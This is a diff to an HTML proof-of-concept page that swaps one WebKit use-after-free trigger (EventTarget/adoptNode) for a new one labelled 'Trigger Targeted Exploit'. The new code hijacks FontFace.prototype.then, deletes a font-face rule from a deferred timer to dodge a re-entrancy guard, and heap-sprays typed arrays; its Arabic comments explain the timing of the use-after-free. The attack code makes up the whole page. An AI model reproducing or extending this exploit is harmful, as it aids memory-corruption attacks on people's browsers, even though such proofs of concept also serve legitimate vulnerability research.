@@ -1,37 +1,47 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <style id="targetStyle">
+        @font-face { 
+            font-family: 'ExploitFont'; 
+            src: url(data:font/woff2;base64,d09GMgABAAAAA); 
+            unicode-range: U+0041; 
+        }
+    </style>
+</head>
 <body>
-<p>Use-after-free in Webkit EventTarget.</p>
-<button onclick="main()">Click to trigger the bug</button>
+    <button onclick="triggerExploit()">Trigger Targeted Exploit</button>
+    <script>
+        function triggerExploit() {
+            let sprayed = [];
+            let font = new FontFace('ExploitFont', 'local(Arial)', { unicodeRange: 'U+0041' });
+            document.fonts.add(font);
 
-<script>
-function main() {
-    const f = document.body.appendChild(document.createElement('iframe'));
+            // اعتراض عملية الـ then للتحكم في توقيت الـ UAF
+            Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
+                get() {
+                    // استخدام setTimeout لتأجيل الحذف للخروج من النطاق المحمي (Re-entrancy Guard)
+                    setTimeout(() => {
+                        try {
+                            document.getElementById('targetStyle').sheet.deleteRule(0);
+                            
+                            // رش الذاكرة المحدود (100 كتلة) لتجنب الـ OOU
+                            for (let i = 0; i < 100; i++) {
+                                sprayed.push(new Uint32Array(32)); 
+                            }
+                            console.log("Heap spray complete.");
+                        } catch(e) {
+                            console.error("Spray error:", e);
+                        }
+                    }, 0);
+                    return undefined;
+                }
+            });
 
-    const a = document.createElement('div');
-    const b = a.appendChild(document.createElement('div'));
-
-    a.addEventListener('a', eval(`(function () {
-        document.adoptNode(a);
-        f.remove();
-
-        throw {
-            line: 1,
-            column: 1,
-            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
-        };
-    })`));
-
-    a.addEventListener('a', () => {});
-
-    b.addEventListener('a', () => {
-        f.contentDocument.adoptNode(a);
-    });
-
-    b.dispatchEvent(new Event('a', { bubbles: true }));
-}
-
-</script>
-
+            console.log("Triggering Font Loading...");
+            document.fonts.load('1em ExploitFont', 'A');
+        }
+    </script>
 </body>
 </html>
